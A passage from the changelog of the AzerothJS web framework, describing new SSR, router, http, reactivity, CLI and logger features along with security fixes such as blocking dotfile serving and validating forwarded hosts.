  cannot hold duplicates) so a session + a CSRF cookie both reach the client.
- **@azerothjs/http (static)**: `staticFiles` no longer follows a symlink out of the
  served root (a real-path containment check is enforced) and no longer serves
  dotfiles (`/.env`, `/.git/config`) - hidden files are 404 by default, with
  `.well-known` exempt and a `dotfiles` opt-in.
- **@azerothjs/schema**: `.optional().refine()` (and `.nullable()`) no longer throws
  a `TypeError` on an absent field. The optional marker now propagates through
  `refine`/`nullable`, and a refinement is skipped when the value is absent - an
  omitted optional field was previously a 500 on otherwise-valid input.
- **@azerothjs/kit (SSR)**: the shell splice uses function replacers, so rendered
  content or loader data containing `$&`, `` $` ``, or `$'` can no longer splice the
  document's own head/tail into the output.
- **compiler (projection)**: `generateVirtualCode` no longer throws on incomplete
  source. A mid-typing parse failure (the normal editing state) now degrades to a
  verbatim projection instead of throwing - which previously took down ALL
  TypeScript IntelliSense project-wide through the tsserver plugin.

Two silent-corruption traps in declaration scanning are now loud diagnostics
(warnings from the build, errors in the editor) instead of miscompiling:

- **compiler**: `azeroth/unterminated-declaration` - a missing `;` that lets one
  declaration absorb the next (`state a = 1` newline `state b = 2` parsed as a
  single declaration, silently dropping `b`) is now flagged at the swallowed
  keyword.
- **compiler**: `azeroth/non-ascii-name` - a non-ASCII character in a declaration
  name (`state café`), which the ASCII-only scanner would truncate silently, is now
  flagged.

### Added

- **kit** (NEW package): `@azerothjs/kit` - the assembled car. Per-route rendering
  over the pieces that already exist: the router's own route table gains one
  optional field (`render: 'server' | 'static' | 'client'`) and the kit does the
  rest - no new routing system, no new data layer, no config format.
  `createPageRenderer(App, routes)` (the SSR bundle's one line) renders a url
  through the router's guards and loaders via `matchAndLoad` - a redirecting guard
  surfaces as a REAL 302, parallel loader data rides the hydration handoff - and
  splices into vite's built shell so hashed asset tags survive. `mountPages(app,
  { routes, clientDir, renderer })` registers every page in its mode plus asset
  fallback on an `@azerothjs/http` app. `bootClient(App)` is the whole client
  entry (hydrate over markup, render into an empty shell, handoff read back).
  The `azeroth-kit-prerender` bin (also programmatic via `@azerothjs/kit/prerender`)
  writes every `render: 'static'` page through the real renderer at build time,
  preserving the pristine shell as `shell.html`; a static page that redirects or
  carries path parameters is a loud build error. Parameterized pages under an
  inherited `static` mode downgrade to per-request SSR. 12 behavioral tests drive
  the real HTTP kernel, real renderToString, and real hydrate - no mocks.

- **cli**: `azeroth build` detects a kit app (`src/entry.server.ts` +
  `@azerothjs/kit` installed) and plans the full production build - client build,
  SSR bundle (`vite build --ssr`), then the prerender pass; an SSR entry without
  the kit installed gets an honest note, never a silent skip.

- **create-azeroth**: the fullstack template now runs ON the kit - the
  before/after proof of the assembly. `src/routes.ts` is the one table (home
  `render: 'static'`, guest book `render: 'server'`); `entry.server.ts` is two
  lines (`createPageRenderer` + the re-exported routes); `main.azeroth` is one
  call (`bootClient(App)`); the server mounts everything with `mountPages`. The
  hand-wired `entry-server.ts` render/splice, `scripts/prerender.mjs`, the
  hydrate-or-render branching, and the per-path static routes are all DELETED -
  replaced by the kit calls. The SSR bundle is self-contained (`ssr.noExternal`),
  so the Docker image copies two build artifacts and needs no client
  node_modules; `SSR_ENTRY` joins the environment surface. The server package now
  declares `@azerothjs/schema` (previously resolved only through hoisting). The
  application half's scripts delegate to the CLI (`azeroth dev` / `check` /
  `build`) exactly like the standalone templates - the kit build steps live in
  ONE place, the CLI's printable plan, instead of being duplicated as a raw
  command line in the workspace script.

### Fixed

- **compiler / language-server / editors**: the `mount` keyword is now first-class
  across the WHOLE toolchain, not just the parser. It gains hover documentation
  and a completion snippet in the language server (both editors receive them over
  LSP), and the wrapper-keyword table moved to `keyword-spec.ts` (`WRAPPER_FN`) as
  the single source the parser AND the tooling completeness guards key off - a
  future wrapper keyword that ships without docs or a snippet now FAILS the suite
  (the hole that let `mount` slip through). Stale `watch` remnants are gone: the
  VS Code grammar's dead `watch (` rule is replaced by a real
  `effect (deps)` anchor (the renamed form was previously uncoloured), the
  JetBrains lexer no longer paints `watch` as a keyword, and hovering
  `effect (deps)` now serves the explicit-dependency documentation instead of the
  auto-tracked effect's. Both editor artifacts rebuilt against the train
  (`azerothjs-vscode-1.0.0-beta.2.vsix`, `azerothjs-jetbrains-1.0.0-beta.2.zip`),
  with the vsix stager taught to strip the bundled typescript-plugin's workspace
  dependencies (its dist is self-contained; the declared-dependency fix from the
  tooling fold broke vsce's npm-list probe).

- **azerothjs (SSR)**: `renderToString`/`renderToStaticMarkup` now establish a
  disposable ownership root around the render, exactly as client-side `render()`/
  `hydrate()` do - a root component that calls `provideContext()` (every router
  app: `<RouterProvider>`) previously CRASHED server rendering with
  "provideContext() called outside any ownership scope".

- **azerothjs (router)**: the guarded-match pipeline rides effects, and effects
  never run in string mode - so `<Routes>` serialized the FALLBACK for every url
  during SSR. The router now accepts the raw match synchronously at construction
  in string mode. Guards gate NAVIGATION; by the time a server renders, the
  request was already routed and authorized (`matchAndLoad` runs the chain's
  guards server-side and turns redirects/vetoes into real 302s/skips BEFORE
  rendering) - the string render is a pure serializer of that decision.

- **language-server**: the formatting placement, stated. The README now documents
  the deliberate 1.0 posture: one formatting engine (the language-service provider -
  document, range, and on-type), TypeScript regions formatted by the real TS
  formatter mapped through the projection, and markup preserved VERBATIM by
  construction (unmappable edits are dropped - the formatter structurally cannot
  mangle markup). Markup pretty-printing joins this engine when it comes - never
  a second implementation that could disagree with the editors.

- **project**: the trust pages. `GOVERNANCE.md` states plainly how the project is
  run - single maintainer, and exactly WHAT BINDS decisions (the normative grammar,
  the ratified syntax-stability policy, SemVer over the lockstep train, the test
  suite as executable specification) - including the single-maintainer question
  answered with structural mitigations rather than promises. `SUPPORT.md` gains
  the honest support-window statement (latest release line supported, one-command
  upgrade via `azeroth upgrade`, no LTS designation before the 2.0 horizon).
  `SECURITY.md` stays in sync with the train (the folded package name fixed, the
  upgrade path referenced).

- **cli**: two new verbs. `azeroth test` runs each half's vitest suite (server
  first), planned and printable like every other command. `azeroth upgrade [target]`
  moves every `azerothjs`/`@azerothjs/*`/`create-azeroth` pin across the root and
  its workspaces to one version (a dist-tag like `beta` resolves to a concrete
  version first), preserving each pin's range prefix and the file's formatting
  byte-for-byte, then runs `npm install` and the doctor; `--print` shows the change
  table without touching anything. The READMEs now document the scaffold canon -
  `npm create azeroth@latest` - with the warning that bare `npx azeroth` outside a
  project resolves an unrelated squatted npm package.

- **create-azeroth**: the fullstack template is now the CANON TOUR. Two client
  routes through the router in `.azeroth` (`<RouterProvider>`/`<Routes>`/`<Link
  activeClass end>`), ONE shared contract file both halves import
  (`server/src/contract.ts`, client-safe by construction), the API consumed through
  the fully inferred typed client, a guest-book form whose `form` keyword uses the
  SAME schema the server boundary enforces (one declaration, three enforcement
  points - the 422 field map lands in the form), the `mount { }` keyword, and an
  SSR'd + HYDRATED home route (prerendered at build via `vite build --ssr` + a
  splice script; `main.azeroth` adopts the markup; client-routed pages get the SPA
  shell so direct loads never mismatch). Dockerfile and CI carry over unchanged;
  the frontend/backend templates are demoted to minimal starters pointing at the
  canon. The scaffold guard now checks API paths across every application source.

- **compiler**: the TextMate grammar ships with the package -
  `@azerothjs/compiler/azeroth.tmLanguage.json` - one canonical copy any
  TextMate-compatible consumer (Shiki, docs generators) loads directly; welded by
  test to the VS Code extension bundle so the two can never diverge. The README
  shows the three-line Shiki registration; the native github-linguist submission
  is prepared as a post-release action.

- **compiler**: declaration emit shares one host across files. The `.d.ts` emitter
  (the vite `emitDeclarations` mirror, the WebStorm `.azeroth-types` bridge) now
  parses lib files AND every node_modules dependency once per process and shares a
  module-resolution cache, instead of rebuilding the dependency universe per file.
  Measured on a 120-component corpus with chained imports: 43.3 -> 20.0 ms/file cold,
  37.9 -> 17.1 ms/file warm (2.2x), byte-identical output. Project-local files are
  still read fresh every emit, so watch sessions see edits.
- **compiler**: the vanished-component diagnostic. The parser is total, so a
  `component` header that fails its shape check (missing name, unbalanced type
  parameters, missing body brace) used to silently become plain TypeScript - the
  component just did not exist. `diagnoseModule` now emits
  `azeroth/malformed-component` naming exactly what is wrong, surfaced as a dev
  warning by the Vite plugin. Only clear declaration intent triggers: ordinary
  identifiers named `component` (member access, annotations, assignments, strings,
  comments) stay silent.
- **compiler / language**: the `mount { ... }` wrapper keyword - the post-connection
  lifecycle block, lowering to `onMount(() => { ... })`. It completes the lifecycle
  triad with `cleanup { }` and `dispose { }` (mount was the one moment still written
  as a function call). Shape-gated like every keyword: `mount(fn)` and a local named
  `mount` stay plain code, and a new `azeroth/keyword-shadow` diagnostic warns when a
  body-local binding shadows a capture-guarded keyword. Editor tooling (hover docs,
  completion snippet, VS Code + JetBrains highlighting) ships in the same change.
- **compiler / docs**: `GRAMMAR.md` - the normative `.azeroth` grammar (lexical
  rules, every disambiguation, the contextual-keyword table, explicit non-goals) -
  and `STABILITY.md` - the ratified 1.x syntax-stability policy: the keyword-set
  freeze, the five-point rubric any future keyword must pass, and semver-for-syntax
  (PATCH: never; MINOR: rubric-passing additions only; MAJOR: everything else, with
  codemods).

- **router**: the navigation-UX layer. (1) GUARDS - `guard` on a route runs
  root-to-leaf BEFORE anything renders or loads: return `false` to veto (the previous
  location is restored, the guarded route never matches, its loaders never start), a
  target or `redirect(...)` to go elsewhere (replacing the vetoed entry), or `true`
  to pass; async guards hold the navigation (`pending()` covers the window), first
  veto wins, and `matchAndLoad` runs the same guards server-side, surfacing redirects
  as `{ redirect, replace }` for a real 302. (2) `redirect(to, { replace? })` - the
  sentinel loaders THROW to turn a navigation into another one, client and server.
  (3) `router.block(fn)` - leave blockers for the unsaved-form case: `false` (sync or
  awaited) keeps the user in place; browser back/forward blocking is best-effort and
  synchronous-only (documented - the History API cannot truly veto a pop).
  (4) HISTORY STAMPS - every router-written entry carries a key + index, so
  `location()` now tells the whole story: `navigationKind` ('push'/'replace'/'pop'),
  `delta` (-1 back, +1 forward - direction is finally knowable), and a stable `key`
  per entry; the Routes `transition` callback receives the same fields.
  (5) MANAGED SCROLLING (on by default): push/replace scrolls to top or the `#hash`
  target, pop RESTORES the position recorded for that entry; a per-navigation
  `scroll` option overrides, `scrollBehavior` is the fine-grained escape hatch,
  `scroll: false` opts out. (6) ROUTE-CHANGE FOCUS (on by default): after a
  navigation swap, focus moves to the new content (a `data-route-focus` element
  wins) so keyboard and screen-reader users land where the navigation took them;
  `focus: false` opts out. (7) `Link` grows a reactive `to` (function form - href,
  active state, and click target all track it) and prefix-aware active matching:
  `/users` is active at `/users/42` (segment-boundary safe), `end: true` demands
  exactness, and `to="/"` is exact by default.
- **router**: the v2 core. (1) PER-LEVEL PARALLEL LOADERS - every matched route in the
  chain may declare a loader and ALL levels start simultaneously (a layout loads beside
  its leaf, never in a waterfall); a level that genuinely needs its parent's result
  awaits the new `parent` promise (nearest loading ancestor), sequencing opt-in per
  level. `router.loaders` is one resource per level; `router.pending()` is the reactive
  navigation-in-flight signal. (2) LAZY ROUTES - `lazy: () => import('./Page.azeroth')`
  code-splits a route; the chunk races the level's loaders, `<Routes>` holds the
  current screen until it lands (no empty flash), a failed chunk throws into the tree
  for `<ErrorBoundary>`, and `createRouter` boot-validates that every route declares
  exactly one of `component`/`lazy`. (3) `<RouterProvider router>` - every composable
  and router component now resolves the router from context; `useRoute()` instead of
  `useRoute(router)` (the explicit argument stays as an override), and `useLoader()`
  inside a route component resolves ITS level (falling back to the nearest ancestor
  that loads). (4) `defineRoute(path, config)` TYPED HANDLES - pattern-inferred params
  (`.to({ id })` compile-checked), loader-typed `useLoader(handle)`, and a `search`
  schema whose validated+coerced value `useSearch(handle)` returns typed (an invalid
  query degrades to `{}` with one console warning, never a crash). (5) SSR handoff v2 -
  `matchAndLoad` pre-resolves lazy chunks and runs ALL levels' loaders in parallel;
  the wire payload is versioned and per-level, and a stale or older-shaped payload is
  rejected loudly in favor of a normal fetch.

### Changed

- **tooling** (BREAKING for direct importers only): `@azerothjs/language-service`
  folded INTO `@azerothjs/language-server` as the `./language-service` subpath - the
  safe half of the ruled tooling consolidation. It was the one tooling package nothing
  user-facing referenced by name (verified: templates and editors reference
  `@azerothjs/typescript-plugin` in tsconfigs, `@azerothjs/eslint-plugin` in eslint
  configs, and the `azeroth`/`azeroth-tsc` binaries - those four keep their names
  precisely because they ARE user-facing contracts). The typescript-plugin now
  declares its real dependency instead of relying on hoisting. Train: 14 packages.

- **http / api** (BREAKING): `@azerothjs/api` folded INTO `@azerothjs/http` as the
  `./api` subpath - the ruled backend consolidation. `import { defineContract, route,
  mountApi } from '@azerothjs/http/api'`; the browser half at
  `@azerothjs/http/api/client` (unchanged surface, new specifier). One package fewer
  in the train; the standalone `@azerothjs/api` will be deprecated on npm at the next
  publish. The purity welds extend to the new subpaths: `./api` is kernel-pure
  (contracts mount on edge runtimes) and `./api/client` provably never reaches
  server code.

- **router** (BREAKING, per the ratified router-v2 design): `Router.loader` (the single
  leaf resource) is replaced by per-level `Router.loaders` - `useLoader(router)` keeps
  the old "deepest loading level" meaning; `LoaderHandoff` is now
  `{ version, path, data: unknown[] }` (array by level); `Route.loader` receives
  `{ params, query, signal, parent }`; `router.navigationKind()` is DELETED - read
  `location().navigationKind`; `matchAndLoad` returns `MatchAndLoadResult` (handoff,
  `{ redirect }`, or null); router-written history entries WRAP user state
  (`history.state.state` carries what you passed to `navigate`); scroll and focus
  defaults change observable behavior (opt-outs: `scroll: false`, `focus: false`,
  per-navigation `scroll`).

- **http**: trusted-proxy URL truth. `serve(app, { trustProxy: true })` (granularly
  `{ proto: true }` / `{ host: true }`, also on `serveH2c` and `toWebRequest`) believes
  `X-Forwarded-Proto`/`X-Forwarded-Host` from a declared terminating proxy, so
  `context.url` carries the client's real scheme and host behind nginx/ALB/Cloudflare
  instead of the internal hop's `http://`. Off by default - the headers are
  caller-forgeable without a proxy (the same explicit trust boundary `clientIp` draws).
  The first entry of a comma-joined chain wins; a forwarded host is validated as
  host[:port] (no path or credential smuggling into the URL) and a forwarded proto
  only counts as `http`/`https`.
- **http**: `streamMultipart(request)` - the pull-based multipart iterator for uploads
  beyond memory. Parts arrive in posted order as they come off the socket; each payload
  is a `ReadableStream` piped straight to its sink (disk, object storage), with
  `bytes()`/`text()` per-part helpers (capped) for small parts. Same validation posture
  as the buffered reader: wrong content type is a 415, framing violations are typed
  400s, part-count and header caps hold, and parsing is chunk-edge safe (a boundary
  split across transport chunks parses byte-identically). Single-pass discipline:
  advancing the iterator discards the current part's unread remainder, and every exit -
  terminal delimiter, error, or an early `break` - releases the request body reader.
- **http**: static files answer single-range `Range` requests - a 206 streams exactly
  the requested span (video seeking, download resume), an unsatisfiable range is a 416
  with the total size, and multi-range or malformed headers are ignored with the full
  200 (RFC 9110 permits this; multipart/byteranges buys real clients nothing).
  `If-Range` holds by ETag or `Last-Modified` date, so a resumed download never splices
  two versions of a file; `Accept-Ranges` and `Last-Modified` now ride every response.
  `compressResponse` exempts 206s - a byte range refers to the UNENCODED representation.
- **api**: contract-level file routes. `input: multipart({ fields, limit, maxParts,
  maxFileSize })` declares a multipart/form-data route in the contract; the handler
  receives `{ fields, files }` fully typed - fields validated against the schema (the
  same 422 field map as JSON routes), files buffered within the caps. A non-multipart
  POST is a 415; the OpenAPI document declares the `multipart/form-data` request body
  with the fields schema. The typed client refuses multipart routes loudly (a browser
  posts `FormData` directly); beyond-memory uploads use `streamMultipart` in the handler.
- **api**: the typed reply channel. A route declares its non-default responses per
  status (`responses: { 201: User, 409: Problem }`) and a handler speaks them through
  `reply(status, body?, headers?)` - the body is validated against that status's
  schema exactly like `output` (a violation is the same hidden 500
  `contract-violation`), `reply(204)` sends an empty response, and an undeclared
  status with a body is a compile error. Every declared status becomes its own entry
  in the OpenAPI document with its real schema (a prose-only `docs.errors` entry can
  no longer downgrade it to the generic envelope). A raw `Response` return remains
  the only validation bypass - the non-JSON escape hatch (files, redirects, streams),
  now by documented design. The client keeps its success-body behavior.
- **compiler / azerothjs**: the compiled-output version handshake. Every compiled
  module now asserts the runtime-contract version it was built against
  (`assertRuntimeContract(N)`, once, at load) against the runtime's
  `RUNTIME_CONTRACT_VERSION`. A prebuilt artifact (a published `.azeroth` library's
  dist, a stale bundle) meeting a runtime from a different contract era fails at
  startup with a clear "rebuild with the matching compiler" error instead of
  undefined behavior - this is what lets the compiled-output contract evolve after
  1.0. The compiler's and runtime's versions are welded by a drift test.
- **schema / form / api**: Standard Schema v1 everywhere. Every `@azerothjs/schema`
  schema now carries the `~standard` property, so a house schema plugs into ANY
  Standard-Schema-aware consumer (form resolvers, tRPC, other frameworks) exactly like a
  Zod schema. In the other direction, `FormConfig.schema` and per-field `validate`
  entries accept any SYNCHRONOUS Standard Schema validator (Zod/Valibot/ArkType) beside
  the native one - a team keeps its existing schemas - and the typed client now
  pre-validates a foreign-schema input locally before the request leaves (mapping its
  issue paths to the same flat field map). An async foreign schema in the sync form
  pipeline is a loud configuration error, not a silent skip; foreign schemas still
  degrade to the permissive OpenAPI shape (only native schemas self-describe fully).
- **reactivity**: `onMount(fn)` - the sanctioned post-connection hook. Runs once, one
  microtask after the synchronous render (every insertion path is synchronous, so the
  DOM is connected by then), under the registering owner: effects it creates are owned,
  a returned cleanup runs on unmount, a scope disposed before the microtask never fires
  its callback, and SSR skips it entirely. Refs still fire at construction (documented) -
  capture the element there, do connected-time work in onMount.
- **reactivity**: the ownership tree is now first-class. `createRoot` builds an `Owner`
  node (disposers, parent link, context storage, captured error routing);
  `getOwner()`/`runWithOwner(owner, fn)` let async continuations create effects that
  are OWNED - disposed with their scope instead of leaking - with errors still routed
  to the boundary the owner was created in. `createContext`/`provideContext`/
  `useContext` add owner-tree dependency injection: provided values flow down the tree,
  nearer provides shadow outer ones, sibling scopes are isolated, and values are freed
  on dispose. This is the primitive that lets component libraries thread theming or a
  router without module-level singletons.

### Changed

- **reactivity**: every write is now GLITCH-FREE. A top-level setter runs inside an
  implicit flush: the change wave marks memos and queues affected effects first, then
  each affected effect runs exactly once on fully-settled state - still synchronously,
  before the setter returns. Previously a diamond (one signal feeding two memos read by
  one effect) fired the effect once per branch, the first time on mixed-generation
  state (one memo fresh, one stale). Diamond-shaped updates got ~40% faster (one effect
  run per write instead of two); the single-binding write path pays ~11% for the
  guarantee. `batch()` remains the tool for coalescing MULTIPLE writes into one run,
  and now returns its body's value.

### Changed (BREAKING - beta)

- **http**: the package split into a pure fetch-standard kernel and a Node half.
  `serve`/`serveH2c`/`handleShutdownSignals`/`toWebRequest`/`writeResponse`/
  `staticFiles`/`compressResponse` (and their types) moved to the new
  `@azerothjs/http/node` subpath; the `.` entry now carries ZERO `node:*` imports in
  its module graph (one sanctioned exception: the AsyncLocalStorage request-root seam,
  implemented by Bun, Deno, and workerd) - enforced by a static purity test. New
  `toFetchHandler(app)` bridges an App to any WinterCG fetch runtime (Cloudflare
  Workers, Deno Deploy, Bun.serve, Vercel Edge):
  `export default { fetch: toFetchHandler(app) }`. `WebHandler` now lives on the
  kernel side.

- **THE CONSOLIDATION**: `azerothjs` is now ONE REAL PACKAGE. The six frontend packages -
  `@azerothjs/reactivity`, `@azerothjs/component`, `@azerothjs/renderer`,
  `@azerothjs/server` (SSR), `@azerothjs/router`, `@azerothjs/form` - are DISCONTINUED
  and live inside `azerothjs` (they were exact-pin lockstep and compiled output always
  imported `azerothjs`, so the split was never real). Migration: `import { ... } from
  'azerothjs'` everywhere the scoped names were used - every public symbol is unchanged.
  The publish train shrinks to 16 packages; `@azerothjs/schema`, the backend stack, the
  compiler, and the tooling packages are untouched.

- **store**: the `@azerothjs/store` package is DISCONTINUED - `createStore` now lives in
  `@azerothjs/reactivity`, whose store-scope machinery it always built on (134 LOC split
  across two packages was a boundary, not a module). `import { createStore } from
  'azerothjs'` is unchanged; a direct `@azerothjs/store` import becomes
  `@azerothjs/reactivity`.

- **api**: ONE mount form. `implementContract` and the legacy
  `mountApi(implementation, { guards })` overload are REMOVED (with the
  `Implementation`/`HandlersOf`/`HandlerFor`/`ApiGuard`/`MountOptions` types) - the
  unified `mountApi(app, contract, { guards, handlers })` is the only way, and the only
  one whose guard additions type into handlers. Factories share the guards map via
  `HandlersWithGuards`.
- **http**: `App.plugin(fn)` folded into `register` - one plugin verb accepting both a
  named `AzerothPlugin` and a bare function transform. `createLogger` renamed
  `createMinimalLogger` (it collided with `@azerothjs/logger`'s `createLogger` with an
  incompatible `Logger` type). `EdgeMiddleware` renamed `HandlerWrapper` (it decorates a
  handler; it never was the context-middleware algebra). `use()`'s aliasing and
  short-circuit typing caveats are now documented on the method - prefer `with()` where
  exactness matters.
- **http/api**: the QUERY method surface (`app.query`, the `query()` route factory,
  `queryResult`, `acceptQuery`) is flagged `@experimental` - RFC 10008 is not yet
  deployed internet reality; the API is stable within 1.x but marked until the RFC is.

- **azerothjs / reactivity**: internal machinery left the public surface. Compiled
  `.azeroth` output now imports its runtime from the new `azerothjs/internal` subpath -
  the single compiled-output contract, welded to the compiler by a drift test - and the
  public entry no longer exports `tmpl`/`bindHole`/`bindContent`/`bindEvent`/`bindSlot`/
  `bindProps`/`setProp` (rebuild apps with the matching compiler). `@azerothjs/reactivity`
  moved its framework plumbing (`serializeChild`, `wrapContentsAnchored`, the hydration
  adoption protocol, `setStoreScopeResolver`, the `subscriberCount` test probe) to
  `@azerothjs/reactivity/internal`; the public entry keeps the user primitives plus
  `ssr`/`isSSRNode`/`escapeText`/`escapeAttr`. Internal subpaths are exempt from semver.

- **reactivity**: `setSSRMarkers`/`getSSRMarkers` are REMOVED. Hydration markers are no
  longer a mutable global - they ride the render window itself:
  `runInMode('string', fn, { markers: true })` (what `renderToString` does) vs
  `{ markers: false }` (`renderToStaticMarkup`). Marker state is now render-scoped and
  exception-safe by construction - a throwing render cannot leak marker state into the
  next request - and backing the render context with per-async-context storage later
  (streaming SSR) becomes a one-accessor change.

- **server**: `island()` no longer wraps the island in a `<span style="display:contents">` -
  the anchor attributes now ride on the island component's OWN root element, so an island
  is valid anywhere its root is (a `<tr>` island sits directly in a `<tbody>`) and
  direct-child selectors keep working. An island component must render a single element
  root (now enforced with a descriptive error). `hydrateIslands()` adopts the new form;
  pages server-rendered by an older version must be re-rendered.
- **reactivity**: `catchError` returns `T | undefined` instead of a silently-undefined `T` -
  the caught case is now visible to the type checker.

### Fixed

- **api**: the client substitutes path parameters at identifier boundaries - `:id` no
  longer corrupts a sibling parameter named `:ida`.
- **ws**: two `attachWebSockets` endpoints coexist on one server - a path-mismatched
  endpoint no longer destroys a sibling endpoint's handshake; an upgrade nobody claims
  still gets exactly one clean 404.
- **http**: SSE connections drop a client that falls `maxBufferedBytes` (default 1 MiB)
  behind instead of buffering unbounded - EventSource reconnects and resumes via
  `Last-Event-ID`; the cap is configurable per stream.
- **create-azeroth**: the fullstack template's demo now calls the `/api/healthz` route the
  server actually defines, and its Dockerfile installs from the root workspace context so
  `docker build` succeeds (a workspace member has no lockfile of its own). Both are now
  guarded by scaffold tests.
- **eslint-plugin**: the plugin/processor `meta.version` is read from the package manifest
  instead of a hard-coded string that had gone stale.
- Release engineering: version bumps are structured per file kind (anchored manifest
  edits with parse validation, anchored gradle edit, exact-string docs) with a post-bump
  guard that fails on any drifted version example - the corruption class that once
  rewrote a CONTRIBUTING example into nonsense.

## [1.0.0-beta.2] - 2026-07-24

The terminal-experience release: `azeroth dev` becomes a designed frame instead of a
pipe multiplexer, and the logger's developer face renders meaning instead of strings.

### Changed (BREAKING - beta, no back-compat shim by design)

- **api**: the unified typed mount. `mountApi(app, contract, { guards, handlers })` now
  types guard additions INTO each handler's context and CHECKS the guards-map keys
  against the contract tree. A guard built with the new `guard()` helper carries its
  additions (`guard((context) => ({ accountId }))`), and every handler it protects reads
  `context.accountId` with NO cast; a mis-typed guard key (`'accont.*'`) is a compile
  error, not a silently-unguarded route. The legacy
  `mountApi(app, implementContract(contract, handlers), { guards })` form is retained for
  separate construction (its handlers type without additions - guarded routes there use a
  knowing cast). `HandlerArgs` was already renamed `HandlerContext`; new exports:
  `guard`, `Guard`, `GuardKey`, `GuardMap`, `HandlersWithGuards`, `TypedMountOptions`.
- **api**: **bring your own validator**. `route({ input, query, output })` accepts any
  [Standard Schema](https://standardschema.dev) validator (Zod, Valibot, ArkType via the
  `~standard` property) in addition to native `@azerothjs/schema`. A foreign schema
  validates the boundary (422 with the same field-path errors); its OpenAPI entry
  degrades to the honest permissive shape (native schemas keep full self-description).
- **http/api**: every handler now takes ONE argument, the `context`, and returns the
  response - `(context) => Response`, replacing http's `(request, ctx)` and the
  contract handler's `({ params, input, query, request, context })` five-name
  destructure. The context carries `request` (the raw web-standard Request), `params`,
  `url`, and - on contract routes - the validated `input`/`query`; whatever middleware
  or a mount guard adds lands FLAT on the same object. This unifies the two handler
  shapes into one, matching the single-context model the current framework generation
  proved developers want, while keeping what nobody else has: responses enforced
  against their declared schema, and the typed client + OpenAPI derived from the same
  contract. Migration is mechanical: `(request, ctx)` → `(context)` with `request` →
  `context.request`; `({ input, context })` → `(context)` reading `context.input` and
  `(context as typeof context & Guarded)` for guard additions. `Middleware` and
  `ApiGuard` take the context too (`(context) => additions | Response | void`). The
  `HandlerArgs` type is renamed `HandlerContext`.

### Added

- **api**: OpenAPI 3.1 export - the contract's third exporter after the server mount
  and the typed client. `toOpenApi(contract, { info })` derives the complete document
  from the declaration (paths, params, bodies, response shapes, operation ids and tags
  from the contract tree, the framework's 422/415/500 envelope responses);
  `openapiPlugin` serves it - plus a docs page at `/docs` with two viewers:
  **Scalar via CDN shell (default)** for the best-in-class UI, and
  **`viewer: 'azeroth'`** - the house explorer, a fully self-contained page (inline
  styles/script, zero external requests, works offline) in the AzerothJS design
  language with REST-colored methods, verdict-colored statuses, schema trees, and a
  same-origin try-it panel (`docs: false` for spec-only);
  `uncontracted(app, contract)` reports coverage for
  partial adoption. Deterministic output (byte-identical builds - specs diff cleanly
  in CI), shared schema instances dedupe into named components, and every mapping rule
  is tested with honest degradations - a `.refine()` becomes a
  description note, never an invented constraint. Routes gain an optional display-only
  `docs` field (summary/tags/deprecated/errors/security) for what a machine cannot know.
- **schema**: schemas are now fully self-describing - `meta` carries the constraints
  the validator enforces (the same options object, one source of truth), true kinds
  and payloads for `literal`/`enumOf`/`record`/`union`, and each `.refine()`'s declared
  code. `boolean`/`array` options gained named types (`BooleanOptions`, `ArrayOptions`);
  `SchemaMeta` is exported for compile-from-declaration consumers.
- **http**: `jsonEncoder` reads the richer self-description - `record` gains a real
  fast path, `literal` compiles to a constant, `enum` encodes as a string; `union`
  stays on the byte-exact fallback.
- **cli**: the dev conductor's line discipline - fixed-width colored stream badges
  (one hue per app half, dim `│` gutter), blank lines swallowed, each tool's session
  chatter rewritten to house style with its information intact (tsc watch banners →
  `compiling...` / `✓ compiled clean` / `✖ N errors`; node --watch lifecycle →
  `↻ restarting` / `crashed`), vite's identity block folded into one composed
  `✓ Ready in ...` frame listing every half's URL, and a one-line farewell on Ctrl+C.
- **cli**: `azeroth dev --raw` - verbatim child output, no environment additions,
  for debugging the tools themselves.
- **cli**: capability propagation - children keep their colors and pretty log faces
  under the conductor's pipe (`FORCE_COLOR` tier + `AZEROTH_LOG=pretty`, forwarded
  only when the conductor itself is on a TTY and never overriding the user's own
  environment); a piped/CI conductor stays byte-clean end to end.
- **cli**: `check`/`build` gained dim step headings and a closing verdict line
  (`✓ all checks passed` / `✓ build complete`).
- **logger**: `prettySink({ hide })` - context fields a human should not re-read on
  every line (a constant `service`, a `requestId`) can be hidden from the pretty
  face only; NDJSON faces and files always keep every field.
- **logger**: semantic values on the pretty face - `http(s)://` URLs render in the
  brand ice-blue, `status` codes as verdicts (2xx green / 3xx cyan / 4xx yellow /
  5xx red), request methods in their REST colors.
- **logger**: request sentences - a record shaped like `logRequests` output renders
  as `GET /healthz → 200 · 0.48ms` instead of `key=value` scaffolding; incomplete
  shapes (or hiding any ingredient) fall back to ordinary pairs.

### Changed

- **cli**: the server half of a dev session now starts on tsc's first compile
  report instead of a file-existence heuristic - one compile, one boot, no doubled
  `listening` line; tsc watch runs `--pretty` (colored diagnostics under the pipe)
  and node runs `--watch-preserve-output` (a child must not reset the terminal).
- **cli**: the live dev view no longer echoes full child command lines - `--print`
  remains the transparency surface, `--raw` still echoes them.
- **cli**: `doctor` verdict marks joined the glyph vocabulary (`✓`/`✖`/`−` with
  ASCII fallbacks).
- **logger**: the pretty face's calm rules - seconds-only dim clock (sub-second
  precision lives in measured fields), bold messages, `info` drops its level word
  (the icon carries it) while warn/error keep theirs with level-tinted messages,
  field pairs hang off dim interpuncts, and the tautological `url=` label drops
  before a URL value. Display only: values are never altered.
- **logger**: quiet text renders as a real gray at 256/truecolor tiers instead of
  ANSI faint, which several Windows console hosts draw as plain - the dim/bold
  hierarchy now survives every terminal.
- **logger**: `supportsUnicode()` is true on every Windows console a supported Node
  can run in (the env-marker allowlist was obsolete), and `colorTier()` recognizes
  the JetBrains terminal and defaults a bare Windows TTY to truecolor.

### Fixed

- **cli**: the dev supervisor no longer loses child colors, prints doubled boot
  lines, or lets `node --watch` clear the terminal on restart.
- **logger**: `logRequests` documentation taught a silent-terminal configuration
  (`stream: fileStream(...)` with no tee); the README now shows the tee recipe.

## [1.0.0-beta.1] - 2026-07-24

The first 1.0 beta. The framework becomes a full stack with one entry point: a
scaffolder (`npm create azeroth`), a CLI that understands every project shape, an
error pipeline and middleware model apps can shape without forking, and a logger
that persists. Everything below rode through the production pass: every new package
hardened file by file, every gate green (2017 tests), all 23 packages publint-clean.

### Added

- `@azerothjs/logger`: log files. `fileStream(target)` is a buffered NDJSON writer -
  point it at a file to append forever, or at a folder for day-named files with
  size rotation and retention. Rotation is RENAME-FREE (a new name opens; the old file
  stops growing), the design that is correct on Windows where open files cannot be
  renamed. Lines batch in a bounded buffer and land on a size threshold, a flush
